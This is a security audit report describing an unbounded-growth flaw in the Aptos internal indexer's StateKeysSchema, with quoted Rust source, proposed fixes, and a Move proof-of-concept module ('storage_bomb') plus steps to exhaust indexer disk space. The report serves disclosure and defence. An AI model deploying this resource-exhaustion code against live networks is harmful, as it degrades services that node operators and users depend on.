# Audit Report

## Title
Unbounded StateKeysSchema Growth Enables Indexer Disk Space Exhaustion Attack

## Summary
The internal indexer's `StateKeysSchema` accumulates state keys indefinitely without any deletion or pruning mechanism. Attackers can exploit this by repeatedly creating Move tables and adding items, generating unlimited unique `StateKey::TableItem` entries that exhaust indexer disk space over time.

## Finding Description

The vulnerability exists in the internal indexer's state key tracking mechanism. When processing write sets, the indexer adds state keys to `StateKeysSchema` for creation and modification operations, but never removes them for deletion operations. [1](#0-0) 

The code only tracks `is_creation() || is_modification()` operations, completely ignoring deletions. Once a `StateKey` is added to the schema, it remains forever.

Each Move table creation generates a unique handle using SHA3-256 hashing: [2](#0-1) 

Each table item then creates a unique `StateKey::TableItem` combining the handle and key bytes: [3](#0-2) 

**Attack Path:**
1. Attacker deploys a Move module that creates tables in a loop
2. Each `table::new()` call generates a unique handle (costs 20,000 gas)
3. Adding items to each table creates unique `StateKey::TableItem` entries
4. Even if the attacker deletes items or destroys tables, the `StateKeys` remain in the indexer
5. Repeated execution over time accumulates millions of state keys
6. Indexer nodes running with `enable_statekeys=true` experience unbounded disk growth

The vulnerability breaks **Invariant #9 (Resource Limits)**: operations must respect storage constraints. The indexer has no mechanism to bound or prune the `StateKeysSchema`, violating storage resource limits.

## Impact Explanation

This is a **High Severity** vulnerability per Aptos bug bounty criteria:

- **Validator node slowdowns**: Indexer nodes with `enable_statekeys=true` will experience degraded performance as the RocksDB column family grows unbounded
- **Storage exhaustion**: The `STATE_KEYS_CF_NAME` column family grows linearly with unique state keys created, eventually filling disk space
- **Service disruption**: Indexer APIs that depend on state key lookups (account resources, prefixed queries) will become slow or unavailable

The impact is limited to indexer infrastructure rather than consensus nodes, preventing Critical severity classification. However, indexer nodes are critical for user-facing APIs and account-based queries. [4](#0-3) 

## Likelihood Explanation

**Likelihood: High**

The attack is straightforward to execute:
- No special privileges required - any transaction sender can create tables
- Gas costs are moderate (20,000 gas per table creation)
- Attackers can distribute attacks over time to avoid detection
- No rate limiting exists on table creation beyond gas payment
- The indexer feature is enabled on production nodes serving public APIs

The vulnerability has been present since the introduction of `StateKeysSchema` and affects all nodes with `enable_statekeys=true`. The lack of any deletion or pruning logic makes this a guaranteed accumulation over the network's lifetime, even from legitimate usage patterns.

## Recommendation

Implement one or both of the following mitigations:

**Option 1: Add Deletion Tracking**
Modify the indexer to track deletions and remove corresponding state keys:

```rust
// In storage/indexer/src/db_indexer.rs, line 489
if self.indexer_db.statekeys_enabled() {
    writeset.write_op_iter().for_each(|(state_key, write_op)| {
        if write_op.is_creation() || write_op.is_modification() {
            batch.put::<StateKeysSchema>(state_key, &())
                .expect("Failed to put state keys to a batch");
        } else if write_op.is_deletion() {
            batch.delete::<StateKeysSchema>(state_key)
                .expect("Failed to delete state key from batch");
        }
    });
}
```

**Option 2: Implement StateKeys Pruning**
Add a pruner that removes state keys for deleted items based on a configured retention window, similar to the existing state value pruner. [5](#0-4) 

**Option 3: Add Storage Limits**
Implement per-account limits on the number of unique state keys that can be created, with gas escalation for exceeding quotas.

## Proof of Concept

```move
module attacker::storage_bomb {
    use extensions::table::{Self, Table};
    use std::vector;
    
    struct TableHolder has key {
        tables: vector<Table<u64, u64>>,
    }
    
    /// Create many tables to exhaust indexer storage
    public entry fun exhaust_indexer_storage(account: &signer, num_tables: u64) {
        let tables = vector::empty<Table<u64, u64>>();
        let i = 0;
        
        while (i < num_tables) {
            // Each table creation generates a unique handle
            let table = table::new<u64, u64>();
            
            // Add items with unique keys to create more StateKeys
            let j = 0;
            while (j < 100) {
                table::add(&mut table, i * 100 + j, j);
                j = j + 1;
            };
            
            // Even if we delete items, StateKeys remain in indexer
            j = 0;
            while (j < 100) {
                table::remove(&mut table, i * 100 + j);
                j = j + 1;
            };
            
            vector::push_back(&mut tables, table);
            i = i + 1;
        };
        
        if (!exists<TableHolder>(@attacker)) {
            move_to(account, TableHolder { tables });
        };
    }
}
```

**Execution:**
1. Deploy the module above
2. Call `exhaust_indexer_storage(account, 1000)` repeatedly
3. Each invocation creates 1,000 tables Ã— 100 items = 100,000 unique `StateKey::TableItem` entries
4. Monitor indexer DB growth: `du -sh <indexer_db_path>/STATE_KEYS_CF_NAME/`
5. Observe unbounded growth as state keys accumulate without deletion

## Notes

This vulnerability specifically affects nodes configured with `enable_statekeys=true` in their `InternalIndexerDBConfig`. While this is not the default configuration, it is commonly enabled on:
- Public API nodes serving account queries
- Archive nodes providing historical data
- Indexer infrastructure for explorers and wallets

The attack is economically viable because attackers only pay gas for table creation (~20,000 gas units), but the storage burden is permanent and borne by indexer operators. Over months of operation, even organic usage patterns will cause significant growth without proper cleanup mechanisms.

### Citations

**File:** storage/indexer/src/db_indexer.rs (L489-497)
```rust
            if self.indexer_db.statekeys_enabled() {
                writeset.write_op_iter().for_each(|(state_key, write_op)| {
                    if write_op.is_creation() || write_op.is_modification() {
                        batch
                            .put::<StateKeysSchema>(state_key, &())
                            .expect("Failed to put state keys to a batch");
                    }
                });
            }
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L366-383)
```rust
    // Take the transaction hash provided by the environment, combine it with the # of tables
    // produced so far, sha256 this to produce a unique handle. Given the txn hash
    // is unique, this should create a unique and deterministic global id.
    let mut digest = Sha3_256::new();
    let table_len = table_data.new_tables.len() as u32; // cast usize to u32 to ensure same length
    Digest::update(&mut digest, table_context.session_hash);
    Digest::update(&mut digest, table_len.to_be_bytes());
    let bytes = digest.finalize().to_vec();
    let handle = AccountAddress::from_bytes(&bytes[0..AccountAddress::LENGTH])
        .map_err(|_| partial_extension_error("Unable to create table handle"))?;
    let key_type = context.type_to_type_tag(&ty_args[0])?;
    let value_type = context.type_to_type_tag(&ty_args[1])?;
    assert!(table_data
        .new_tables
        .insert(TableHandle(handle), TableInfo::new(key_type, value_type))
        .is_none());

    Ok(smallvec![Value::address(handle)])
```

**File:** types/src/state_store/state_key/mod.rs (L190-202)
```rust
    pub fn table_item(handle: &TableHandle, key: &[u8]) -> Self {
        Self(
            REGISTRY
                .table_item(handle, key)
                .get_or_add(handle, key, || {
                    Ok(StateKeyInner::TableItem {
                        handle: *handle,
                        key: key.to_vec(),
                    })
                })
                .expect("only possible error is resource path serialization"),
        )
    }
```

**File:** config/src/config/internal_indexer_db_config.rs (L56-62)
```rust
    pub fn enable_statekeys(&self) -> bool {
        self.enable_statekeys
    }

    pub fn is_internal_indexer_db_enabled(&self) -> bool {
        self.enable_transaction || self.enable_event || self.enable_statekeys
    }
```

**File:** storage/indexer_schemas/src/schema/state_keys/mod.rs (L12-34)
```rust
define_pub_schema!(StateKeysSchema, StateKey, (), STATE_KEYS_CF_NAME);

impl KeyCodec<StateKeysSchema> for StateKey {
    fn encode_key(&self) -> Result<Vec<u8>> {
        Ok(self.encoded().to_vec())
    }

    fn decode_key(data: &[u8]) -> Result<Self> {
        let state_key: StateKey = StateKey::decode(data)?;
        Ok(state_key)
    }
}

impl ValueCodec<StateKeysSchema> for () {
    fn encode_value(&self) -> Result<Vec<u8>> {
        Ok(Vec::new())
    }

    fn decode_value(data: &[u8]) -> Result<Self> {
        ensure_slice_len_eq(data, 0)?;
        Ok(())
    }
}
```
